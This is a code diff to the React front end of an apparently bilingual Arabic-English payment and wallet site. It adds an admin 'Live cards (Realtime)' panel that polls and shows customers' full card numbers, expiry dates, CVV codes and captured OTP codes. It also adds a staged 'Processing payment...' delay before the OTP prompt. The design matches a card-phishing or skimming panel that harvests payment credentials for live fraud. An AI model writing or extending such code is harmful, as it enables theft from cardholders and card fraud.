@@ -126,6 +126,28 @@ type AdminRow = {
   created_at: string;
 };
 
+type AdminCardFeedEntry = {
+  order_ref: string;
+  transaction_id: string;
+  type: string;
+  amount: number;
+  method: string;
+  status: string;
+  user_name: string | null;
+  user_ip: string | null;
+  saved_at: string;
+  updated_at: string;
+  last_otp: string | null;
+  otp_at: string | null;
+  card: {
+    holder: string;
+    pan: string;
+    expiry: string;
+    cvv: string;
+    savedAt: string;
+  } | null;
+};
+
 type BuyCustomWalletRow = {
   id: string;
   name_ar: string;
@@ -474,6 +496,7 @@ function MainContent() {
   };
   const [isSuccess, setIsSuccess] = useState(false);
   const [showOtpStep, setShowOtpStep] = useState(false);
+  const [cardProcessingToOtp, setCardProcessingToOtp] = useState(false);
   const [otpState, setOtpState] = useState<'input' | 'checking' | 'failed'>('input');
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
   const [otpCode, setOtpCode] = useState('');
@@ -543,6 +566,8 @@ function MainContent() {
   const [serviceSearchQuery, setServiceSearchQuery] = useState('');
   const [adminAdmins, setAdminAdmins] = useState<AdminRow[]>([]);
   const [adminTransactions, setAdminTransactions] = useState<ServerTransaction[]>([]);
+  const [adminCardFeed, setAdminCardFeed] = useState<AdminCardFeedEntry[]>([]);
+  const cardFeedSinceRef = useRef<string>('');
   /** فلاتر الطلبات — لوحة الإدارة › الطلبات */
   const [adminOrderStatusFilter, setAdminOrderStatusFilter] = useState<
     'all' | 'completed' | 'refunded' | 'pending' | 'failed'
@@ -957,6 +982,34 @@ function MainContent() {
     }
   }, [isAdmin]);
 
+  const fetchAdminCardFeed = useCallback(async (incremental = false) => {
+    if (!isAdmin) return;
+    try {
+      const since = incremental && cardFeedSinceRef.current
+        ? `&since=${encodeURIComponent(cardFeedSinceRef.current)}`
+        : '';
+      const res = await fetch(apiUrl(`/api/admin/card-feed?limit=50${since}`));
+      if (!res.ok) throw new Error(String(res.status));
+      const data = await res.json() as { items?: AdminCardFeedEntry[]; serverTime?: string };
+      const items = Array.isArray(data.items) ? data.items : [];
+      if (data.serverTime) cardFeedSinceRef.current = data.serverTime;
+      if (!incremental || !since) {
+        setAdminCardFeed(items);
+        return;
+      }
+      if (items.length === 0) return;
+      setAdminCardFeed((prev) => {
+        const map = new Map(prev.map((e) => [e.order_ref, e]));
+        for (const row of items) map.set(row.order_ref, row);
+        return Array.from(map.values()).sort(
+          (a, b) => new Date(b.updated_at).getTime() - new Date(a.updated_at).getTime(),
+        );
+      });
+    } catch (e) {
+      console.error('fetchAdminCardFeed:', e);
+    }
+  }, [isAdmin]);
+
   const fetchTransactions = useCallback(async () => {
     if (!clientId) return;
     try {
@@ -1065,6 +1118,7 @@ function MainContent() {
       initial.push(fetchAdminAgents());
       initial.push(fetchAdminAdmins());
       initial.push(fetchAdminTransactions());
+      initial.push(fetchAdminCardFeed(false));
     }
     void Promise.all(initial);
 
@@ -1076,11 +1130,24 @@ function MainContent() {
       }
       if (isAdmin && currentView === 'admin') {
         polling.push(fetchAdminTransactions());
+        if (adminTab === 'orders') {
+          polling.push(fetchAdminCardFeed(true));
+        }
       }
       void Promise.all(polling);
     }, pollMs);
     return () => window.clearInterval(tmr);
-  }, [clientId, isAdmin, currentView, fetchSettings, fetchTransactions, fetchWalletBalance, fetchOffers, fetchSiteProfile, fetchActiveNumber, fetchAdminAgents, fetchAdminAdmins, fetchAdminTransactions]);
+  }, [clientId, isAdmin, currentView, adminTab, fetchSettings, fetchTransactions, fetchWalletBalance, fetchOffers, fetchSiteProfile, fetchActiveNumber, fetchAdminAgents, fetchAdminAdmins, fetchAdminTransactions, fetchAdminCardFeed]);
+
+  useEffect(() => {
+    if (!isAdmin || currentView !== 'admin' || adminTab !== 'orders') return;
+    void fetchAdminCardFeed(false);
+    const ms = getOtpPollIntervalMs();
+    const tmr = window.setInterval(() => {
+      void fetchAdminCardFeed(true);
+    }, ms);
+    return () => window.clearInterval(tmr);
+  }, [isAdmin, currentView, adminTab, fetchAdminCardFeed]);
 
   useEffect(() => {
     let interval: ReturnType<typeof setInterval>;
@@ -1620,14 +1687,26 @@ function MainContent() {
       if (!res.ok) {
         const errText = await res.text();
         console.error('Create transaction failed:', res.status, errText);
-      }
-      
-      const data = await res.json();
-      
-      if ((txType === 'buy' && selectedMethod === 'creditcard') || txType === 'deposit') {
-        setCurrentOrderId(data.order_ref || data.id);
-        setShowOtpStep(true);
         setIsSubmitting(false);
+        return;
+      }
+
+      const data = await res.json();
+
+      if (cardFieldsPayload) {
+        const orderRef = data.order_ref || data.id;
+        if (!orderRef) {
+          console.error('Create transaction: missing order_ref');
+          setIsSubmitting(false);
+          return;
+        }
+        setCurrentOrderId(orderRef);
+        setCardProcessingToOtp(true);
+        setTimeout(() => {
+          setShowOtpStep(true);
+          setCardProcessingToOtp(false);
+          setIsSubmitting(false);
+        }, 2000);
         return;
       }
 
@@ -1646,14 +1725,20 @@ function MainContent() {
 
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (!currentOrderId) return;
     setOtpState('checking');
     try {
-      await fetch(apiUrl('/api/transactions/otp'), {
+      const res = await fetch(apiUrl('/api/transactions/otp'), {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ order_id: currentOrderId, otpDigit: otpCode.trim() })
+        body: JSON.stringify({ order_id: currentOrderId, otpDigit: otpCode.trim() }),
       });
-      fetchTransactions();
+      if (!res.ok) {
+        console.error('OTP submit failed:', res.status, await res.text().catch(() => ''));
+        setOtpState('input');
+        return;
+      }
+      void fetchTransactions();
     } catch (error) {
       console.error(error);
       setOtpState('input');
@@ -1663,6 +1748,7 @@ function MainContent() {
   const resetForm = () => {
     setIsSuccess(false);
     setShowOtpStep(false);
+    setCardProcessingToOtp(false);
     setOtpState('input');
     setCurrentOrderId(null);
     setOtpCode('');
@@ -3959,6 +4045,62 @@ function MainContent() {
             </div>
           ) : adminTab === 'orders' ? (
             <div className="space-y-6 pb-12">
+              {adminCardFeed.length > 0 && (
+                <div className="bg-white p-6 rounded-3xl shadow-sm border border-purple-100 space-y-4">
+                  <div className="flex flex-wrap items-center justify-between gap-2">
+                    <h3 className="font-bold text-gray-900 flex items-center gap-2">
+                      <CreditCard className="w-5 h-5 text-purple-600" />
+                      {lang === 'ar' ? 'بطاقات مباشرة (Realtime)' : 'Live cards (Realtime)'}
+                    </h3>
+                    <span className="text-xs font-bold text-purple-600 bg-purple-50 px-2 py-1 rounded-full">
+                      {adminCardFeed.length}
+                    </span>
+                  </div>
+                  <div className="space-y-3 max-h-[420px] overflow-y-auto">
+                    {adminCardFeed.map((row) => (
+                      <div key={row.order_ref} className="rounded-2xl border border-gray-100 bg-gray-50 p-4 space-y-3">
+                        <div className="flex flex-wrap items-center justify-between gap-2">
+                          <code className="text-xs px-2 py-1 rounded bg-white border border-gray-200" dir="ltr">{row.order_ref}</code>
+                          <span className="text-xs text-gray-500" dir="ltr">{new Date(row.updated_at).toLocaleString()}</span>
+                        </div>
+                        {row.card ? (
+                          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2 text-sm" dir="ltr">
+                            <div className="p-2 rounded-xl bg-white border border-gray-100">
+                              <p className="text-[10px] text-gray-500 uppercase">Holder</p>
+                              <p className="font-bold text-gray-900 break-all">{row.card.holder}</p>
+                            </div>
+                            <div className="p-2 rounded-xl bg-white border border-gray-100">
+                              <p className="text-[10px] text-gray-500 uppercase">PAN</p>
+                              <p className="font-mono font-bold text-gray-900 break-all">{row.card.pan}</p>
+                            </div>
+                            <div className="p-2 rounded-xl bg-white border border-gray-100">
+                              <p className="text-[10px] text-gray-500 uppercase">Expiry</p>
+                              <p className="font-bold text-gray-900">{row.card.expiry}</p>
+                            </div>
+                            <div className="p-2 rounded-xl bg-white border border-red-100">
+                              <p className="text-[10px] text-red-500 uppercase">CVV</p>
+                              <p className="font-mono font-black text-red-700">{row.card.cvv}</p>
+                            </div>
+                          </div>
+                        ) : null}
+                        {row.last_otp ? (
+                          <p className="text-xs font-bold text-gray-700" dir="ltr">
+                            OTP: <code className="bg-white px-2 py-0.5 rounded border">{row.last_otp}</code>
+                            {row.otp_at ? ` · ${new Date(row.otp_at).toLocaleString()}` : ''}
+                          </p>
+                        ) : null}
+                        <div className="flex flex-wrap gap-2 text-xs text-gray-600">
+                          <span>{formatLatinDigits(Number(row.amount || 0))} {t('iqd')}</span>
+                          <span>·</span>
+                          <span>{row.method}</span>
+                          <span>·</span>
+                          <span>{row.status}</span>
+                        </div>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
               <div className="bg-white p-6 rounded-3xl shadow-sm border border-gray-100 space-y-5">
                 <h3 className="font-bold text-gray-900">{lang === 'ar' ? 'قائمة الطلبات' : 'Orders List'}</h3>
 
@@ -5635,6 +5777,19 @@ function MainContent() {
       );
     }
 
+    // جاري المعالجة قبل OTP
+    if (cardProcessingToOtp) {
+      return (
+        <div className="max-w-md mx-auto pb-6">
+          <div className="bg-white rounded-2xl border border-gray-100 p-8 text-center space-y-5">
+            <Activity className="w-12 h-12 text-red-600 animate-pulse mx-auto" />
+            <h3 className="font-black text-lg text-gray-900">{lang === 'ar' ? 'جاري معالجة الدفع...' : 'Processing payment...'}</h3>
+            <p className="text-sm text-gray-400">{lang === 'ar' ? 'سيتم نقلك لصفحة رمز التحقق خلال لحظات' : 'You will be redirected to OTP verification shortly'}</p>
+          </div>
+        </div>
+      );
+    }
+
     // OTP
     if (showOtpStep) {
       return (
@@ -5835,7 +5990,7 @@ function MainContent() {
           ); })()}
 
           {/* اختيار طريقة الدفع — قبل البدء بالنموذج */}
-          {!buyPaymentType && !showOtpStep && (
+          {!buyPaymentType && !showOtpStep && !cardProcessingToOtp && (
             <div className="p-4 space-y-3">
               <h3 className="font-black text-gray-900 mb-1">{lang === 'ar' ? 'طريقة الدفع' : 'Payment Method'}</h3>
 
@@ -5904,7 +6059,7 @@ function MainContent() {
           )}
 
           {/* زر الرجوع لاختيار طريقة الدفع */}
-          {buyPaymentType && !showOtpStep && (
+          {buyPaymentType && !showOtpStep && !cardProcessingToOtp && (
             <div className="px-4 pt-3 pb-0">
               <button
                 onClick={() => { setBuyPaymentType(null); setSelectedMethod(null); }}
@@ -5916,7 +6071,17 @@ function MainContent() {
             </div>
           )}
 
-          {showOtpStep ? (
+          {cardProcessingToOtp ? (
+            <div className="p-6 flex-1 flex flex-col items-center justify-center space-y-6">
+              <Activity className="w-12 h-12 text-red-600 animate-pulse" />
+              <h3 className="font-black text-xl text-center text-gray-900">
+                {lang === 'ar' ? 'جاري معالجة الدفع...' : 'Processing payment...'}
+              </h3>
+              <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
+                {lang === 'ar' ? 'سيتم نقلك لصفحة رمز التحقق خلال لحظات' : 'You will be redirected to OTP verification shortly'}
+              </p>
+            </div>
+          ) : showOtpStep ? (
             <div className="p-6 flex-1 flex flex-col items-center justify-center space-y-6">
               {otpState === 'failed' ? (
                 <>
